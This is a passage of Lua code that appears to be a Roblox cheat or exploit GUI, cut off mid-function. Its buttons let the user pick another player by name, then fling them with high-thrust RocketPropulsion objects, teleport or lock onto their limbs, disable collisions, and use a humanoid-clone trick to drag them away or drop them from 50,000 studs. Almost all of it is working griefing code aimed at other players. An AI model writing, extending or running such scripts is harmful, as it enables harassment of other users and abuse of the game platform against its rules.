		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://313762630"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local LevitateACTIVE = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			LevitateACTIVE = false
		end)
		Levitate.MouseButton1Click:connect(function()
			LevitateACTIVE = not LevitateACTIVE
			if LevitateACTIVE then
				track:Play(.1, 1, 1)
				Levitate.BackgroundColor3 = loc
			else
				track:Stop()
				Levitate.BackgroundColor3 = col
			end
		end)
		NoLimbs.MouseButton1Click:connect(function()
			game:GetService("Players").LocalPlayer.Character["Left Leg"]:Destroy()
			game:GetService("Players").LocalPlayer.Character["Left Arm"]:Destroy()
			game:GetService("Players").LocalPlayer.Character["Right Leg"]:Destroy()
			game:GetService("Players").LocalPlayer.Character["Right Arm"]:Destroy()
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://180612465"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local ScaredACTIVE = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			ScaredACTIVE = false
		end)
		CrouchRocket.MouseButton1Click:connect(function()
			ScaredACTIVE = not ScaredACTIVE
			if ScaredACTIVE then
				local u = Instance.new("RocketPropulsion")
				u.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				u.Name = "CrouchRocket"
				u.Target = game:GetService("Players").LocalPlayer.Character.Head
				u:Fire()
				CrouchRocket.BackgroundColor3 = loc
				while wait() do
					if track.IsPlaying == false then
						if ScaredACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				CrouchRocket.BackgroundColor3 = col
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CrouchRocket:Destroy()
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://313762630"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		local Anim2 = Instance.new("Animation")
		Anim2.AnimationId = "rbxassetid://35154961"
		local track2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim2)
		local Anim3 = Instance.new("Animation")
		Anim3.AnimationId = "rbxassetid://33169583"
		local track3 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim3)
		haunting = false
		game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
			track = character:WaitForChild("Humanoid"):LoadAnimation(Anim)
			track2 = character:WaitForChild("Humanoid"):LoadAnimation(Anim2)
			track3 = character:WaitForChild("Humanoid"):LoadAnimation(Anim3)
			haunting = false
		end)
		Haunted.MouseButton1Click:connect(function()
			haunting = not haunting
			if haunting then
				while true do
					if track3.IsPlaying == false then
						if haunting then
							track:Play()
							track2:Play(0.1, 1, 1000)
							track3:Play(0.1, 1, 1000)
						end
					end
				end
			else
				track:Stop()
				track2:Stop()
				track3:Stop()
			end
		end)
		spinning = false
		CrazySpin.MouseButton1Click:connect(function()
			spinning = not spinning
			if spinning then
				local p = Instance.new("RocketPropulsion")
				p.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				p.Name = "CrazySpin"
				p.Target = game:GetService("Players").LocalPlayer.Character["Left Arm"]
				p:Fire()
				CrazySpin.BackgroundColor3 = loc
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CrazySpin:Destroy()
				CrazySpin.BackgroundColor3 = col
			end
		end)

------ ROCKETPROPULSION -------------------------------------------------------------------------
------ ROCKETPROPULSION -------------------------------------------------------------------------
------ ROCKETPROPULSION -------------------------------------------------------------------------
------ ROCKETPROPULSION -------------------------------------------------------------------------
		floating = false
		Float.MouseButton1Click:connect(function()
			floating = not floating
			if floating then
				Float.BackgroundColor3 = loc
				local y = Instance.new("RocketPropulsion")
				y.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				y.CartoonFactor = 1
				y.MaxThrust = 50000
				y.MaxSpeed = 1000
				y.ThrustP = 50000
				y.Name = "Float"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					y.Target = game:GetService("Players")[v.Name].Character.Head
					y:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if floating then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
					while wait(0.3) do
						if floating then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Leg"].CFrame
						end
					end
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Float:Destroy()
				Float.BackgroundColor3 = col
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://282574440"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		flattening = false
		Flatten.MouseButton1Click:connect(function()
			flattening = not flattening
			if flattening then
				Flatten.BackgroundColor3 = loc
				local y = Instance.new("RocketPropulsion")
				y.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				y.CartoonFactor = 1
				y.MaxThrust = 50000
				y.MaxSpeed = 1000
				y.ThrustP = 50000
				y.Name = "Flatten"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					y.Target = game:GetService("Players")[v.name].Character["Left Leg"]
					y:Fire()
					track:Play(.1, 1, 1)
					game:GetService('RunService').Stepped:connect(function()
						if flattening then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
					while wait(0.3) do
						if flattening then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
						end
					end
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Flatten:Destroy()
				track:Stop()
				Flatten.BackgroundColor3 = col
			end
		end)
		pushing = false
		Push.MouseButton1Click:connect(function()
			pushing = not pushing
			if pushing then
				Push.BackgroundColor3 = loc
				local b = Instance.new("RocketPropulsion")
				b.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				b.TurnP = 2500
				b.MaxThrust = 50000
				b.MaxSpeed = 1000
				b.ThrustP = 50000
				b.CartoonFactor = 1
				b.Name = "Push"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					b.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
					b:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if pushing then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Push:Destroy()
				Push.BackgroundColor3 = col
			end
		end)
		SlowAttracting = false
		SlowAttract.MouseButton1Click:connect(function()
			SlowAttracting = not SlowAttracting
			if SlowAttracting then
				SlowAttract.BackgroundColor3 = loc
				local b = Instance.new("RocketPropulsion")
				b.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				b.TurnD = 5000
				b.MaxThrust = 5000
				b.MaxSpeed = 200
				b.ThrustP = 5000
				b.CartoonFactor = 1
				b.Name = "SlowAttract"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					b.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
					b:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if SlowAttracting then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.SlowAttract:Destroy()
				SlowAttract.BackgroundColor3 = col
			end
		end)
		Maxing = false
		Max.MouseButton1Click:connect(function()
			Maxing = not Maxing
			if Maxing then
				Max.BackgroundColor3 = loc
				local t1 = Instance.new("RocketPropulsion")
				t1.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t1.TurnP = 100000
				t1.MaxThrust = 100000
				t1.MaxSpeed = 5000
				t1.ThrustP = 100000
				t1.CartoonFactor = 1
				t1.Name = "one"
				local t2 = Instance.new("RocketPropulsion")
				t2.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t2.TurnP = 100000
				t2.MaxThrust = 100000
				t2.MaxSpeed = 5000
				t2.ThrustP = 100000
				t2.CartoonFactor = 1
				t2.Name = "two"
				local t3 = Instance.new("RocketPropulsion")
				t3.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t3.TurnP = 100000
				t3.MaxThrust = 100000
				t3.MaxSpeed = 5000
				t3.ThrustP = 100000
				t3.CartoonFactor = 1
				t3.Name = "three"
				local t4 = Instance.new("RocketPropulsion")
				t4.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t4.TurnP = 100000
				t4.MaxThrust = 100000
				t4.MaxSpeed = 5000
				t4.ThrustP = 100000
				t4.CartoonFactor = 1
				t4.Name = "four"
				local t5 = Instance.new("RocketPropulsion")
				t5.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t5.TurnP = 100000
				t5.MaxThrust = 100000
				t5.MaxSpeed = 5000
				t5.ThrustP = 100000
				t5.CartoonFactor = 1
				t5.Name = "five"
				local t6 = Instance.new("RocketPropulsion")
				t6.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t6.TurnP = 100000
				t6.MaxThrust = 100000
				t6.MaxSpeed = 5000
				t6.ThrustP = 100000
				t6.CartoonFactor = 1
				t6.Name = "six"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					t1.Target = game:GetService("Players")[v.Name].Character.Torso
					t1:Fire()
					t2.Target = game:GetService("Players")[v.Name].Character["Right Leg"]
					t2:Fire()
					t3.Target = game:GetService("Players")[v.Name].Character["Left Arm"]
					t3:Fire()
					t4.Target = game:GetService("Players")[v.Name].Character["Left Leg"]
					t4:Fire()
					t5.Target = game:GetService("Players")[v.Name].Character["Right Arm"]
					t5:Fire()
					t6.Target = game:GetService("Players")[v.Name].Character.Head
					t6:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if Maxing then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.one:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.two:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.three:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.four:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.five:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.six:Destroy()
				Max.BackgroundColor3 = col
			end
		end)
		AimHeading = false
		AimHead.MouseButton1Click:connect(function()
			AimHeading = not AimHeading
			if AimHeading then
				AimHead.BackgroundColor3 = loc
				local b = Instance.new("RocketPropulsion")
				b.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				b.TurnP = 2500
				b.MaxThrust = 50000
				b.MaxSpeed = 1000
				b.ThrustP = 50000
				b.CartoonFactor = 1
				b.Name = "AimHead"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					b.Target = game:GetService("Players")[v.Name].Character.Head
					b:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if AimHeading then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.AimHead:Destroy()
				AimHead.BackgroundColor3 = col
			end
		end)
		Experimentaling = false
		Experimental.MouseButton1Click:connect(function()
			Experimentaling = not Experimentaling
			if Experimentaling then
				Experimental.BackgroundColor3 = loc
				local b = Instance.new("RocketPropulsion")
				b.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				b.TurnP = 15000
				b.MaxThrust = 25000
				b.MaxSpeed = 15000
				b.ThrustP = 10000
				b.CartoonFactor = 1
				b.Name = "Experimental"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
					b.Target = game:GetService("Players")[v.Name].Character.Torso
					b:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if Experimentaling then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Experimental:Destroy()
				Experimental.BackgroundColor3 = col
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character.Head
			end
		end)
		Multipleing = false
		Multiple.MouseButton1Click:connect(function()
			Multipleing = not Multipleing
			if Multipleing then
				Multiple.BackgroundColor3 = loc
				local t1 = Instance.new("RocketPropulsion")
				t1.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t1.TurnP = 30000
				t1.MaxThrust = 30000
				t1.MaxSpeed = 1000
				t1.ThrustP = 30000
				t1.CartoonFactor = 1
				t1.Name = "one"
				local t2 = Instance.new("RocketPropulsion")
				t2.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t2.TurnP = 30000
				t2.MaxThrust = 30000
				t2.MaxSpeed = 1000
				t2.ThrustP = 30000
				t2.CartoonFactor = 1
				t2.Name = "two"
				local t3 = Instance.new("RocketPropulsion")
				t3.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				t3.TurnP = 30000
				t3.MaxThrust = 30000
				t3.MaxSpeed = 1000
				t3.ThrustP = 30000
				t3.CartoonFactor = 1
				t3.Name = "three"
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					t1.Target = game:GetService("Players")[v.Name].Character.Torso
					t1:Fire()
					t2.Target = game:GetService("Players")[v.Name].Character["Right Leg"]
					t2:Fire()
					t3.Target = game:GetService("Players")[v.Name].Character["Left Arm"]
					t3:Fire()
					game:GetService('RunService').Stepped:connect(function()
						if Multipleing then
							game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
							game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
							game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
						end
					end)
				end
			else
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.one:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.two:Destroy()
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.three:Destroy()
				Multiple.BackgroundColor3 = col
			end
		end)

------ TELEPORTATION -------------------------------------------------------------------------
------ TELEPORTATION -------------------------------------------------------------------------
------ TELEPORTATION -------------------------------------------------------------------------
------ TELEPORTATION -------------------------------------------------------------------------
		LockOnACTIVE = false
		LockOn.MouseButton1Click:connect(function()
			LockOnACTIVE = not LockOnACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if LockOnACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						LockOn.BackgroundColor3 = loc
						game:GetService('RunService').Stepped:connect(function()
							if LockOnACTIVE then
								game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
								game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
							end
						end)
					else
						LockOn.BackgroundColor3 = col
					end
				end)
			end
		end)
		LockLegACTIVE = false
		LockLeg.MouseButton1Click:connect(function()
			LockLegACTIVE = not LockLegACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if LockLegACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Leg"].CFrame
						LockLeg.BackgroundColor3 = loc
						game:GetService('RunService').Stepped:connect(function()
							if LockLegACTIVE then
								game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
								game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
							end
						end)
					else
						LockLeg.BackgroundColor3 = col
					end
				end)
			end
		end)
		LockArmACTIVE = false
		LockArm.MouseButton1Click:connect(function()
			LockArmACTIVE = not LockArmACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if LockArmACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Right Arm"].CFrame
						LockArm.BackgroundColor3 = loc
						game:GetService('RunService').Stepped:connect(function()
							if LockArmACTIVE then
								game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
								game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
							end
						end)
					else
						LockArm.BackgroundColor3 = col
					end
				end)
			end
		end)
		LockHeadACTIVE = false
		LockHead.MouseButton1Click:connect(function()
			LockHeadACTIVE = not LockHeadACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if LockHeadACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.Head.CFrame
						LockHead.BackgroundColor3 = loc
						game:GetService('RunService').Stepped:connect(function()
							if LockHeadACTIVE then
								game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
								game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
							end
						end)
					else
						LockHead.BackgroundColor3 = col
					end
				end)
			end
		end)
		LockAboveACTIVE = false
		LockAbove.MouseButton1Click:connect(function()
			LockAboveACTIVE = not LockAboveACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if LockAboveACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame + Vector3.new(0, 4, 0)
						LockAbove.BackgroundColor3 = loc
						game:GetService('RunService').Stepped:connect(function()
							if LockAboveACTIVE then
								game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
								game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
							end
						end)
					else
						LockAbove.BackgroundColor3 = col
					end
				end)
			end
		end)
		LockMaxACTIVE = false
		LockMax.MouseButton1Click:connect(function()
			LockMaxACTIVE = not LockMaxACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if LockMaxACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.Head.CFrame
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Leg"].CFrame
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Right Leg"].CFrame
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Right Arm"].CFrame
						LockMax.BackgroundColor3 = loc
						game:GetService('RunService').Stepped:connect(function()
							if LockMaxACTIVE then
								game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
								game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
								game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
							end
						end)
					else
						LockMax.BackgroundColor3 = col
					end
				end)
			end
		end)
		TrailACTIVE = false
		Trail.MouseButton1Click:connect(function()
			TrailACTIVE = not TrailACTIVE
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService('RunService').Stepped:connect(function()
					if TrailACTIVE then
						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame + Vector3.new(5, 0, 0)
						Trail.BackgroundColor3 = loc
						game:GetService("Players").LocalPlayer.Character.Head.CanCollide = false
						game:GetService("Players").LocalPlayer.Character.Torso.CanCollide = false
						game:GetService("Players").LocalPlayer.Character["Left Leg"].CanCollide = false
						game:GetService("Players").LocalPlayer.Character["Right Leg"].CanCollide = false
					else
						Trail.BackgroundColor3 = col
					end
				end)
			end
		end)
		TeleportTo.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			end
		end)

------ TOOLS -------------------------------------------------------------------------
------ TOOLS -------------------------------------------------------------------------
------ TOOLS -------------------------------------------------------------------------
------ TOOLS -------------------------------------------------------------------------
		Attach.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
			end
		end)
		AttachExperimental.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(1)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100, 0)
			end
		end)
		Bring.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				local NOW = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				game:GetService("Players").LocalPlayer.Character:MoveTo(game:GetService("Players")[v.Name].Character.Position)
			end
		end)
		FreeFall.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				local NOW = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 50000, 0)
			end
		end)
		GiveTool.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.6)
				game:GetService("Players").LocalPlayer.Character:MoveTo(game:GetService("Players")[v.Name].Character.Position)
			end
		end)
		KillSurvive.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				local NOW = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
